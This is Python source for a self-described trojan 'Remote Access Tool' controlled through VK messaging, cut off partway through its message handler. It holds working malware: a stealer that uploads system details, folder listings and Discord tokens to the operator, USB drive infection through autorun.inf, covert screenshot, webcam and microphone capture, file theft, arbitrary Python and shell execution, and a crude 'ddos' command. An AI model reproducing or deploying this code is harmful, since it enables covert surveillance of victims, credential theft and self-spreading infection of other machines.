# -*- coding: utf-8 -*-

"""
    Remote Access Tool
    Author: Kirill Zhosul.
    https://github.com/kirillzhosul/python-remote-access
"""

# Default modules.
import typing  # Type hinting.
import json  # JSON Parsing.
import os  # System interaction (Environment variables).
import os.path  # System path interaction.
import subprocess  # Console.
import shutil  # Copy files.
import atexit  # At exit handler.
import sys  # System interaction (argv, platform).
import threading  # Threading for message showing (blocking operation).
import re  # Expressions for discord.
import datetime  # Dates for file properties

# If true, show debug messages in console.
DEBUG = True

try:
    # Other modules (Not is preinstalled).
    # TODO: Move at server setup (but for now there is no NON-VK server types.)
    import vk_api  # VK API Itself.
    import vk_api.utils  # VK API Utils.
    import vk_api.upload  # VK API Uploading.
    # There is vk_api.longpoll / vk_api.bot_longpoll imports in server connection,
    # As there is checks for current server type (to not cause import conflicts).

    import requests  # IP API, Discord API.
except ImportError as exception:
    # If there is import error.

    if DEBUG:
        # If debug is enabled.

        # Printing message.
        print(f"[Importing] Cannot import {exception}!")

    # Exiting.
    sys.exit(1)

# Features.

# Keylogger (Will not launch at the start).
FEATURE_KEYLOGGER_ENABLED: bool = False

# Drives watching (Sends message when user update drive)(Disable drives infection).
FEATURE_DRIVES_WATCHING_ENABLED: bool = False

# Drives infection (Writes autorun.inf when connect new drive).
FEATURE_DRIVES_INFECTION_ENABLED: bool = False

# Registers self to the registry autorun key.
FEATURE_AUTORUN_ENABLED: bool = False

# Grabs HWID at the startup (WARNING: Slow, use `get_hwid` command instead)
FEATURE_STARTUP_HWID_GRABBING_ENABLED: bool = False

# Grabs Discor information at the startup (WARNING: Slow, use `discord_profile` command instead).
FEATURE_STARTUP_DISCORD_GRABBING_ENABLED = False

# Other.

# IP When can`t get.
DEFAULT_INVALID_IP = "0.0.0.0.0"

# HWID When can`t get.
DEFAULT_INVALID_HWID = "00000000-0000-0000-0000-000000000000"

# TAGS When can`t get.
DEFAULT_INVALID_TAGS = ["PC", "TAGS_LOADING_ERROR"]

# System OK code.
SYSTEM_OK_STATUS_CODE: int = 0

# Drives that we will skip when infecting drives.
DRIVES_INFECTION_SKIPPED = ("C", "D")

# Not allowes to register self to the registry when running not ".exe" file.
DISALLOW_NOT_EXECUTABLE_AUTORUN = True

# Version of the tool.
VERSION = "[Pre-release] 0.5.5"


# Commands.
# Function: initialise_commands()
commands_functions: typing.Dict[str, typing.Callable] = {}
commands_help: typing.Dict[str, typing.Tuple] = {}


# Settings.

# Config data.
config: typing.Dict = {}

# Client name.
# Function: load_name()
client_name: str = "CLIENT_INITIALISATION_ERROR"

# Client tags.
# Function load_tags()
client_tags: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"]


# Other.

# Work folder.
# Function: set_folder_path()
folder: str = ""

# Current directory for the files commands.
current_directory = os.getcwd()

# Keylogger string.
keylogger_buffer: str = ""

# `python` command output container.
out = None


# Server.
# Function: server_connect()

# VK API Object.
server_api = None

# VK API Longpoll (longpoll / bot_longpoll).
server_longpoll = None


class CommandResult:
    """ Command result class that implements result of the command container. """

    # Text to send.
    __text: typing.Optional[str] = None

    # Attachment to send.
    __attachment: typing.Optional[typing.Tuple[str, str, str]] = None

    # Flag to delete after uploading.
    __attachment_delete_after_uploading = True

    def __init__(self, text=None):
        """
        Constructor.
        :param text: Text to send.
        """

        if text is not None:
            # Create from text if there text given.
            self.from_text(text)

    def from_text(self, text: str) -> None:
        """
        Creates command result from text.
        :param text: Text to send.
        """

        # Set text.
        self.__text = text

        # Reset Attachment.
        self.__attachment = None

    def from_attachment(self, path: str, title: str, type_: str) -> None:
        """
        Creates command result from attachment.
        :param path: Path to upload.
        :param title: Title for attachment.
        :param type_: Type of the document ("doc", "audio_message", "photo")
        """

        # Reset text.
        self.__text = None

        # Set attachment.
        self.__attachment = (path, title, type_)

    def get_text(self):
        """ Text getter. """
        return self.__text

    def get_attachment(self):
        """ Attachment getter. """
        return self.__attachment

    def disable_delete_after_uploading(self):
        """ Disables deletion after uploading. """
        self.__attachment_delete_after_uploading = False

    def should_delete_after_uploading(self):
        """ Returns should we delete file after uploading. """
        return self.__attachment_delete_after_uploading

def spreading_infect_drive(_drive: str) -> None:
    # @function spreading_infect_drive()
    # @returns list
    # @description Function that infects drive with given symbol.

    # TODO: Make autorun folder hidden.

    if not FEATURE_DRIVES_INFECTION_ENABLED:
        # If infection disabled.

        # Returning.
        return

    try:
        # Trying to infect drive.

        if _drive in DRIVES_INFECTION_SKIPPED:
            # If this drive in skipped drives.

            # Returning and not infecting.
            return

        # Code below copies trojan executable in secret folder,
        # And adds this executable in to drive autorun file.

        # Getting executable path.
        _executable_path = "autorun\\autorun." + executable_get_extension()

        if not os.path.exists(_drive + _executable_path):
            # If no executable file there (Not infected already).

            # Building path.
            filesystem_build_path(_drive + _executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], _drive + _executable_path)

            # Writing autorun.inf file.
            with open(_drive + "autorun.inf", "w", encoding="UTF-8") as _autorun:
                # Opening file.

                # Writing.
                _autorun.write(f"[AutoRun]\nopen={_executable_path}\n\naction=Autorun\\Autorun")
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
                      f"Full exception information - {_exception}")
def spreading_thread() -> None:
    # @function spreading_thread()
    # @returns None
    # @description Function for thread of the spreading, spreads virus.

    try:
        # Trying to spread.

        # Getting list of the all current drives.
        _current_drives = filesystem_get_drives_list()

        while True:
            # Infinity loop.

            # Getting latest drives list.
            _latest_drives = filesystem_get_drives_list()

            # Getting connected and disconnected drives.
            _connected_drives = list_difference(_latest_drives, _current_drives)
            _disconnected_drives = list_difference(_current_drives, _latest_drives)

            # Processing connecting of the drives.
            if _connected_drives:
                # Notifying server about connecting and infecting.
                for _drive in _connected_drives:
                    # For every drive in connected drives.

                    # Server message.
                    server_message(f"[Spreading] Connected drive {_drive}!")
                    debug_message(f"[Spreading] Connected drive {_drive}!")

                    # Infecting drive.
                    spreading_infect_drive(_drive)

            # Processing disconnecting of the drives.
            if _disconnected_drives:
                # Notifying server about disconnecting.

                for _drive in _disconnected_drives:
                    # For every drive in disconnected drives.

                    # Server message.
                    server_message(f"[Spreading] Disconnected drive {_drive}!")
                    debug_message(f"[Spreading] Disconnected drive {_drive}!")

            # Updating current drives.
            _current_drives = filesystem_get_drives_list()

    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_thread()! "
                      f"Full exception information - {_exception}")
def spreading_start() -> None:
    # @function spreading_start()
    # @returns None
    # @description Function that starts app spreading.

    if not FEATURE_DRIVES_WATCHING_ENABLED:
        # If spreading is disabled.

        # Returning.
        return

    # Starting listening drives.
    threading.Thread(target=spreading_thread).start()
def assert_operating_system() -> None:
    # @function assert_operating_system()
    # @returns None
    # @description Function that asserting that operating system,
    # @description on which current instance of the trojan is launched are supported.

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
    _supported_platforms = ("win32", "linux")

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
    # and just showing debug message for the it.
    _development_platforms = ("linux",)

    for _platform in _supported_platforms:
        # Iterating over all platforms in the supported platforms.

        if sys.platform.startswith(_platform):
            # If current PC is have this platform (Supported).

            if _platform in _development_platforms:
                # If this is development platform.

                # Showing debug message.
                debug_message("You are currently running this app on platform {_platform} "
                              "which is not fully supported!")

            # Returning from the function as current platform is supported.
            return

    # Code lines below only executes if code above don't found supported platform.

    # Debug message.
    debug_message("Oops... You are running app on the platform "
                  "{sys.platform} which is not supported! Sorry for that!")

    # Raising SystemExit (Exiting code)
    raise SystemExit
def save_name() -> None:
    # @function save_name()
    # @returns None
    # @description Function that saves name to the file.

    try:
        # Trying to save name.

        # Getting path.
        _path = folder + config["paths"]["name"]

        # Building path.
        filesystem_build_path(_path)

        with open(_path, "w", encoding="UTF-8") as _tf:
            # With opened file.

            # Writing name.
            _tf.write(str(client_name))
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function save_name()! "
                      f"Full exception information - {_exception}")
def load_name() -> None:
    # @function load_name()
    # @returns None
    # @description Function that loads all name data.

    # Globalising name.
    global client_name

    try:
        # Trying to load name.

        # Getting path.
        path = folder + config["paths"]["name"]

        # Building path.
        filesystem_build_path(path)

        if os.path.exists(path):
            # If we have name file.

            try:
                # Trying to read name.

                # Clearing name.
                client_name = ""

                with open(path, "r", encoding="UTF-8") as _nf:
                    # With opened file.

                    # Reading name.
                    client_name = str(_nf.read())
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"Can`t load name file! Exception: {exception}")

                # Name.
                client_name = get_ip()["ip"]

                # Saving name.
                save_name()
        else:
            # If we don't have name file.

            # Name.
            client_name = get_ip()["ip"]

            # Saving name.
            save_name()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function load_name()! "
                      f"Full exception information - {_exception}")

        # Name.
        client_name = get_ip()["ip"]  # noqa
def stealer_steal_data(_force: bool = False):
    # @function stealer_steal_data()
    # @returns None
    # @description Function that steals all the data from the client.

    data: typing.Dict[str, typing.Any] = {}

    try:
        # Trying to steal.

        if not stealer_is_already_worked() or _force:
            # If we not already stolen data or forcing.

            # Getting file name.
            _path = folder + config["paths"]["log"]

            # Getting ip data.
            _ip = get_ip()

            # Getting path data.
            _userprofile = os.getenv("userprofile")
            _drive = os.getcwd().split("\\")[0]

            # Writing values.
            data["internet_ipaddress"] = _ip["ip"]
            data["internet_city"] = _ip["city"]
            data["internet_country"] = _ip["country"]
            data["internet_region"] = _ip["region"]
            data["internet_provider"] = _ip["org"]

            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
                # If HWID is not disabled.

                # Writing HWID.
                data["computer_hardware_index"] = get_hwid()

            if not sys.platform.startswith('linux'):
                # If not linux.

                # Windows values.
                data["computer_username"] = os.getenv("UserName")
                data["computer_name"] = os.getenv("COMPUTERNAME")
                data["computer_operating_system"] = os.getenv("OS")
                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_REVISION")
                data["computer_environment_variables"] = get_environment_variables()
                data["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
                data["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
                data["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
                data["directory_root"] = filesystem_try_listdir(_drive + "\\")
                data["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
                data["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
                if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
                    data["discord_tokens"] = stealer_steal_discord_tokens()
                    data["discord_profile"] = stealer_steal_discord_profile(data["discord_tokens"])

            # Building path.
            filesystem_build_path(_path)

            with open(_path, "w", encoding="UTF-8") as _file:
                # With opened file.

                # Dumping.
                json.dump(data, _file, indent=4)

            for _peer in config["server"]["vk"]["peers"]:
                # For every peer in peers.

                # Uploading document.
                uploading_status, uploading_result = server_upload_document(_path, "Log File", _peer, "doc")

                # Message.
                if uploading_status and isinstance(uploading_result, str):
                    # If all is ok.

                    # Message.
                    server_message(f"[Stealer] Stolen data:", uploading_result, _peer)
                else:
                    # If there is error.

                    # Message.
                    server_message(f"[Stealer] Error when uploading stolen data: {uploading_result}", None, _peer)

            # Returning value.
            return data
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function steal_data()! "
                      f"Full exception information - {_exception}")

        # Returning value.
        return {_exception}
def server_upload_photo(_path: str) -> str:
    # @function server_upload_photo()
    # @returns str
    # @description Function that  uploads photo on the server.

    # Getting uploader.
    _uploader = vk_api.upload.VkUpload(server_api)

    # Uploading photo.
    _photo = _uploader.photo_messages(_path)
    _photo = _photo[0]

    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
        # If photo have all those fields.

        # Getting photo fields.
        _owner_id = _photo['owner_id']
        _photo_id = _photo['id']
        _access_key = _photo['access_key']

        # Returning photo URN.
        return f'photo{_owner_id}_{_photo_id}_{_access_key}'

    # Returning blank.
    return ""
def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> any:
    # @function server_upload_photo()
    # @returns any
    # @description Function that executes python code and returns it out in variable out.

    # Getting global out.
    global out

    # Getting clean code.
    clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')

    try:
        # Trying to execute.

        # Executing replaced code.
        exec(clean_code, _globals, _locals)
    except Exception as exception:  # noqa
        # If there is an error.

        # Returning.
        return f"Python code exception: {exception}"

    try:
        # Trying to return out.

        # Returning out.
        return out
    except NameError:
        # If there is an name error.

        # Returning.
        return f"Python code does not return output! Write in out"


# Commands.


def command_screenshot(*_) -> CommandResult:
    """ Command `screenshot` that returns screenshot image. """

    try:
        # Trying to import.

        # Importing.
        import PIL.ImageGrab
    except ImportError:
        # If there is import error.

        # Not supported.
        return CommandResult("This command does not supported on selected PC! (Pillow module is not installed)")

    # Taking screenshot.
    screenshot = PIL.ImageGrab.grab()

    # Getting path.
    path = folder + config["paths"]["screenshot"]

    # Saving it.
    screenshot.save(path)

    # Create result.
    result = CommandResult()
    result.from_attachment(path, "Screenshot", "photo")

    # Returning result.
    return result


def command_webcam(_arguments, _event) -> CommandResult:
    """ Command `webcam` that returns webcam photo. """

    try:
        # Trying to import opencv-python.

        # Importing.
        import cv2
    except ImportError:
        # If there is import error.

        # Not supported.
        return CommandResult(
            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")

    # Getting camera.
    camera = cv2.VideoCapture(0)

    # Getting image.
    _, image = camera.read()

    # Getting path.
    path = folder + config["paths"]["webcam"]

    # Building path.
    filesystem_build_path(path)

    # Writing image file.
    cv2.imwrite(path, image)

    # Deleting camera.
    del camera

    # Creating result for attachment.
    result = CommandResult()
    result.from_attachment(path, "Webcam", "photo")

    # Returning result.
    return result


def command_microphone(arguments, _) -> CommandResult:
    """ Command `microphone` that records voice and sends it. """

    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        return CommandResult("This command does not supported on selected PC! (pyaduio/wave module is not installed)")

    # Getting path.
    path = folder + config["paths"]["microphone"]

    # Record with seconds or without if not passed.
    try:
        record_microphone(path, int(arguments))
    except ValueError:
        record_microphone(path)

    # Create result with uploading.
    result = CommandResult()
    result.from_attachment(path, "Microphone", "audio_message")

    # Returning result.
    return result


def command_download(arguments, _) -> CommandResult:
    """ Command `download` that downloads file from client."""

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        # If path exists.

        if os.path.isfile(path):
            # If this is file.

            if filesystem_get_size(path) < 1536:
                # If file is below need size.

                # Create command result to upload file.
                result = CommandResult()
                result.from_attachment(path, os.path.basename(path), "doc")

                # Disable file deletion after uploading."
                result.disable_delete_after_uploading()

                # Returning result.
                return result

            # If invalid size.
            return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
        elif os.path.isdir(path):
            # If this is directory.

            if filesystem_get_size(path) < 1536:
                # If file is below need size.

                # Uploading.
                return CommandResult("Directories downloading is not implemented yet!")

            # If invalid size.
            return CommandResult("Too big directory to download! Maximal size for download: 1536MB(1.5GB)")
    else:
        # If not exists.

        if os.path.exists(folder + path):
            # Try relative.

            # Call for relative.
            return command_download(folder + path, _)

    # Error.
    return CommandResult("Path that you want download does not exists")


def command_message(arguments: str, _) -> CommandResult:
    """ Command `message` that shows message. """

    try:
        # Trying to import module.

        # Importing module.
        import ctypes
    except ImportError:
        # If there is import error.

        # Not supported.
        return CommandResult("This command does not supported on selected PC! (ctypes module is not installed)")

    # Getting arguments.
    if (arguments := arguments.split(";")) and len(arguments) == 0:
        # If there is no arguments.

        # Message
        return CommandResult("Incorrect arguments! Example: text;title;style")

    # Calling message.
    try:
        # Trying to show message.

        # Arguments check ([text: str, title: str, type: int])
        message_parameters: typing.List[typing.Union[str, int]] = arguments

        # Process optional parameters.
        if len(arguments) <= 0:
            # Text.
            message_parameters.append("")
        if len(arguments) <= 1:
            # Title.
            message_parameters.append("")
        if len(arguments) <= 2:
            # Type.
            message_parameters.append(0)

        # Convert type argument to integer.
        message_parameters[2] = int(message_parameters[2])

        # Creating thread.
        threading.Thread(
            # First argument, is hWND. That is not required.
            #
            target=lambda: ctypes.windll.user32.MessageBoxW(0, *message_parameters)
        ).start()

    except Exception as exception:  # noqa
        # If there is error.

        # Message.
        return CommandResult(f"Error when showing message! Error: {exception}")

    # Message.
    return CommandResult("Message was shown!")


def command_tags_new(arguments, _) -> CommandResult:
    """ Command `tags_new` that replaces tags. """

    if (arguments := arguments.split(";")) and len(arguments) == 0:
        # If no arguments.

        # Message.
        return CommandResult("Incorrect arguments! Example: (tags separated by ;)")

    # Tags that was added.
    new_tags = list(set([tag.replace(" ", "-") for tag in arguments]))

    if len(new_tags) != 0:
        # If tags was added.

        # Globalising tags
        global client_tags

        # Set new tags
        client_tags = new_tags

        # Saving tags.
        save_tags()

        # Message.
        return CommandResult(f"Tags was replaced to: {';'.join(client_tags)}")

    # Message.
    return CommandResult("Tags replacing was not completed! No valid tags passed!")


def command_tags_add(arguments: str, _) -> CommandResult:
    """ Command `tags_add` that adds tags to current. """

    if (arguments := arguments.split(";")) and len(arguments) == 0:
        # If no arguments.

        # Message.
        return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")

    # Globalising tags.
    global client_tags

    # Clean tags.
    tags = [tag.replace(" ", "-") for tag in arguments]

    # Add tags.
    client_tags.extend(tags)

    # Saving tags.
    save_tags()

    # Message.
    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(client_tags)}")


def command_help(arguments, _event) -> CommandResult:
    """ Command `help` that shows help for all commands. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) > 0 and arguments[0] != "":
        # If command given.

        # Getting command.
        command = arguments[0]

        if command not in commands_help:
            # If command not exists.

            # Error.
            return CommandResult(f"Command {command} not exists!")

        # Help information.
        information, using = commands_help[command]

        # Returning information.
        return CommandResult(
            f"[{command}]:\n"
            f"* {information}\n"
            f"* (Use: {using})"
        )

    # Help string.
    help_string = ""

    for command, information in commands_help.items():
        # For all commands and they information.

        # Decompose information.
        information, using = information

        # Add data.
        help_string += f"[{command}]: \n" \
                       f"--{information}\n" \
                       f"-- (Use: {using})\n"

    # Returning.
    return CommandResult(help_string)


def command_properties(arguments, _) -> CommandResult:
    """ Command `properties` that returns properties of the file. """

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        # If path exists.

        # Getting size.
        property_size = f"{filesystem_get_size(path)}MB"

        # Getting type.
        property_type = filesystem_get_type(path)

        # Getting time properties.
        property_created_at = datetime.date.fromtimestamp(os.path.getctime(path))
        property_accessed_at = datetime.date.fromtimestamp(os.path.getatime(path))
        property_modified_at = datetime.date.fromtimestamp(os.path.getmtime(path))

        # Returning properties.
        return CommandResult(
            f"Path: {path},\n"
            f"Size: {property_size},\n"
            f"Type: {property_type},\n"
            f"Modified: {property_modified_at},\n"
            f"Created: {property_created_at},\n"
            f"Accessed: {property_accessed_at}."
        )
    else:
        # If not exists.

        if os.path.exists(folder + path):
            # Try relative.

            # Call for relative.
            return command_properties(folder + path, _)

    # Error.
    return CommandResult("Path does not exists!")


def command_cd(arguments, _) -> CommandResult:
    """ Command `cd` that changes directory. """

    # Globalising current directory.
    global current_directory

    # Get directory path.
    path = arguments

    # Remove trailing slash.
    if path.endswith("\\"):
        path = path[:-1]

    if path.startswith(".."):
        # If go up.

        # Get directory elements.
        path_directories = current_directory.split("\\")

        if len(path_directories) == 1:
            # If last (like C:\\)

            # Error.
            return CommandResult("Already in root! Directory: " + current_directory)

        # Remove last.
        path_directories.pop(-1)

        # TODO: Fix root error (С: without trailing slash).
        if len(path_directories) <= 1:
            # If last (like C:\\)

            # Valid.
            path_directories.append("")

        # Pass path to next cd command.
        path = "\\".join(path_directories)
        return command_cd(path, _)

    if os.path.exists(current_directory + "\\" + path):
        # If this is local folder.

        if not os.path.isdir(current_directory + "\\" + path):
            # If not directory.

            # Error.
            return CommandResult("Can`t change directory to the filename")

        # Changing.
        current_directory += "\\" + path

        # Message.
        return CommandResult(f"Changed directory to {current_directory}")
    else:
        # If not local path.
        if os.path.exists(path):
            # If path exists - moving there.

            if not os.path.isdir(path):
                # If not directory.

                # Error.
                return CommandResult("Can`t change directory to the filename")

            if path == "":
                # If no arguments.

                # Message.
                return CommandResult(f"Current directory - {current_directory}")

            # Changing.
            current_directory = path

            # Message.
            return CommandResult(f"Changed directory to {current_directory}")

        # Message.
        return CommandResult(f"Directory {path} does not exists!")


def command_location(*_) -> CommandResult:
    """ Command `location` that returns location based on IP. """

    # Getting ip data.
    ip_data = get_ip()

    if all(key in ip_data for key in ("ip", "city", "country", "region", "org")):
        # If all required fields exists.

        # Getting ip data.
        address = ip_data["ip"]
        city = ip_data["city"]
        country = ip_data["country"]
        region = ip_data["region"]
        provider = ip_data["org"]

        # Returning.
        return CommandResult(
            f"IP: {address},\n"
            f"Country: {country},\n"
            f"Region: {region},\n"
            f"City: {city},\n"
            f"Provider: {provider}."
        )

    # Error.
    return CommandResult("Couldn't get location from IP data")


def command_name_new(arguments, _) -> CommandResult:
    """ Сommand `name_new` that changes name to other."""

    # Global name.
    global client_name

    if len(arguments) > 0:
        # If correct arguments.

        # Changing name.
        client_name = arguments

        # Saving name
        save_name()

        # Returning.
        return CommandResult(f"Name was changed to {client_name}")

    # Returning.
    return CommandResult("Invalid new name!")


def command_discord_profile_raw(*_) -> CommandResult:
    """ Сommand "discord_profile_raw" that returns information about discord found in system (as raw dict). """

    # Grab tokens.
    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        # If not found any tokens.

        # Error.
        return CommandResult("Discord tokens not found in system!")

    # Get profile.
    profile = stealer_steal_discord_profile(tokens)

    # Returning.
    if profile:
        return CommandResult(json.dumps(profile, indent=2))

    # Error.
    return CommandResult("Discord profile not found (Failed to load)")


def command_ddos(arguments, _) -> CommandResult:
    """ Command `ddos` that start ddos. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) >= 1:
        # If arguments OK.

        # Get address.
        address = arguments[0]

        if len(arguments) > 2 and arguments[2] == "admin":
            # If admin.

            # Get timeout.
            timeout = arguments[1]

            # Pinging from admin.
            # TODO. Disable console output.
            console_response = os.system(f"ping -c {address} {timeout}")

            if console_response == SYSTEM_OK_STATUS_CODE:
                # Message.
                return CommandResult("Completed DDoS (Admin)")

            # Error.
            return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")

        # Pinging from user.
        # TODO. Disable console output.
        console_response = os.system(f"ping {address}")

        if console_response == SYSTEM_OK_STATUS_CODE:
            # Message.
            return CommandResult("Completed DDoS (User)")

        # Error.
        return CommandResult(f"DDoS ping returned non-zero status {console_response}! (User)")

    # Message.
    return CommandResult("DDoS incorrect arguments! Example: address;time;admin or address")


def command_ls(arguments, _) -> CommandResult:
    """ Command `ls` that lists all files in the directory. """

    # Get directory.
    directory_path = arguments if arguments != "" else current_directory

    # Get files.
    # TODO filesystem_try_listdir error handling.
    directory_list = filesystem_try_listdir(directory_path)
    directory_items = ",\n".join([
        ("[D] " + path if os.path.isdir(directory_path + "\\" + path) else "[F] " + path) for path in directory_list
    ]) if directory_list else "Empty (Or error)!"

    # Returning.
    return CommandResult(f"Directory `{directory_path}`:\n" + directory_items)


def command_link(arguments, _) -> CommandResult:
    """ Command `link` that opens link."""

    # Get arguments.
    arguments = arguments.split(";")

    native = False

    if len(arguments) > 1 and arguments[1] == "native":
        # If not native.
        native = True

    if not native:
        # If not native mode .

        try:
            # Trying to open with the module.

            # Importing module.
            import webbrowser  # noqa

            # Opening link.
            webbrowser.open(arguments[0])

            # Message.
            return CommandResult("Link was opened (Via module)!")
        except ImportError:
            # If there is ImportError.
            pass

    # Opening with system.
    # TODO: Linux=open, Windows=start
    # TODO. Disable console output.
    console_response = os.system(f"start {arguments[0]}")

    if console_response == SYSTEM_OK_STATUS_CODE:
        # If OK.

        # Message.
        return CommandResult(f"Link was opened (Via system, native)!")

    # Error..
    return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")


def command_drives(*_) -> CommandResult:
    """ Command `drives` that returns list of all drives in the system. """

    # Returning.
    return CommandResult("Drives: \n" + "Drive: ,\n".join(filesystem_get_drives_list()))


def command_discord_tokens(*_) -> CommandResult:
    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """

    # Getting tokens.
    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        # If not found any tokens.

        # Error.
        return CommandResult("Discord tokens was not found in system!")

    # Returning.
    return CommandResult("Discord tokens:\n" + ",\n".join(tokens))


def command_taskkill(arguments, _) -> CommandResult:
    """ Command `taskkill` that kills task. """

    # Call console.
    # TODO. Disable console output.
    console_response = os.system(f"taskkill /F /IM {arguments}")

    # Executing system and returning result.
    if console_response == SYSTEM_OK_STATUS_CODE:
        # If OK

        # OK Mesasge.
        return CommandResult(f"Task successfully killed!")

    # Error.
    return CommandResult(f"Unable to kill task, there is some error? (Non-zero exit code {console_response})")


def command_upload(*_) -> CommandResult:
    """ Command `upload` that uploads file to the client. """

    # Error. TODO.
    return CommandResult("Not implemented yet!")


def command_python(arguments, _) -> CommandResult:
    """ Command `python` that executes python code. """

    # Executing.
    return CommandResult(execute_python(arguments, globals(), locals()))


def command_tags(*_) -> CommandResult:
    """ Command tags that returns tags list. """

    # Returning.
    return CommandResult(str("Tag: ,\n".join(client_tags)))


def command_version(*_) -> CommandResult:
    """ Command `version` that returns version """

    # Returning.
    return CommandResult(VERSION)


def command_discord_profile(*_) -> CommandResult:
    """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""

    # Getting tokens.
    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        # If not found any tokens.

        # Error.
        return CommandResult("Discord tokens was not found in system!")

    # Getting profile.
    profile = stealer_steal_discord_profile(tokens)

    if profile:
        # Getting avatar.
        # TODO: Why there is some of IDs?.

        # Get avatar.
        if avatar := None and ("avatar" in profile and profile["avatar"]):
            avatar = "\n\n" + f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png"

        # Returning.
        return CommandResult(
            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + avatar
        )
    else:
        # If can`t get.

        # Error.
        return CommandResult("Failed to get Discord profile!")


def command_exit(*_) -> CommandResult:
    """ Command `exit` that exists app. """

    # Exiting.
    sys.exit(0)

    # Message.
    return CommandResult("Exiting...")  # noqa


def command_shutdown(*_) -> CommandResult:
    """ Command `shutdown` that shutdown system. """

    # Shutdown.
    # TODO. Disable console output.
    os.system("shutdown /s /t 0")

    # Message.
    return CommandResult("Shutdowning system (`shutdown /s /t 0`)...")


def command_alive(*_) -> CommandResult:
    """ Command `alive` that show current time. """

    # Getting current time.
    current_time = datetime.datetime.now().strftime("%H:%M:%S")

    # Message.
    return CommandResult(f"Alive! Time: {current_time}")


def command_destruct(*_) -> CommandResult:
    """ Command `destruct` that deletes self from system. """

    # Unregistering from the autorun.
    autorun_unregister()

    # Removing working folder path.
    filesystem_try_delete(folder + config["paths"]["tags"])
    filesystem_try_delete(folder + config["paths"]["name"])
    filesystem_try_delete(folder + config["paths"]["log"])
    filesystem_try_delete(folder + config["paths"]["anchor"])
    filesystem_try_delete(folder + config["paths"]["screenshot"])
    filesystem_try_delete(folder + config["paths"]["microphone"])
    filesystem_try_delete(folder + config["paths"]["webcam"])
    filesystem_try_delete(folder + config["autorun"]["executable"])
    filesystem_try_delete(folder)

    # Exiting.
    return command_exit(*_)


def command_keylog(*_) -> CommandResult:
    """ Command `keylog` that shows current keylog buffer."""

    if not FEATURE_KEYLOGGER_ENABLED:
        # If disabled.

        # Error.
        return CommandResult("Keylogger is disabled!")

    # Returning.
    return CommandResult(keylogger_buffer)


def command_restart(*_) -> CommandResult:
    """ Command `restart` that restarts system. """

    # Restarting.
    # TODO. Disable console output.
    os.system("shutdown /r /t 0")

    # Message.
    return CommandResult("Restarting system (`shutdown /r /t 0`)...")


def command_console(arguments, _) -> CommandResult:
    """ Command `console` that executing console. """

    # Call console.
    # TODO. Disable console output.
    console_response = os.system(arguments)

    # Executing system and returning result.
    if console_response == SYSTEM_OK_STATUS_CODE:
        # If OK
        
        # OK Mesasge.
        return CommandResult(f"Console status code: OK (Exit code {console_response})")

    # Error.
    return CommandResult(f"Console status code: ERROR (Non-zero exit code {console_response})")


# Client.

def execute_command(command_name: str, arguments: str, event) -> CommandResult:
    """ Function that executes command and return it result. """

    for command in commands_functions:
        # For all commands names in commands dict.

        if command_name == command:
            # If it is this commands.

            # Executing command and returning result.
            result: CommandResult = commands_functions[command](arguments, event)
            return result

    # Default answer.
    return CommandResult(f"Invalid command {command_name}! Write `help` command to get all commands!")


def process_message(event) -> None:
    """ Processes message from the server. """

    # Get base message.
    message = event

    # Update message container with type.
    if config["server"]["type"] == "VK_GROUP":
        message = message.message

    # Response answer and attachment.
    answer_text: str = "Void... (No response)"
    answer_attachment = None

    try:
        # Trying to answer.

        # Getting arguments from the message text.
        arguments = message.text.split(";")

        if len(arguments) == 0:
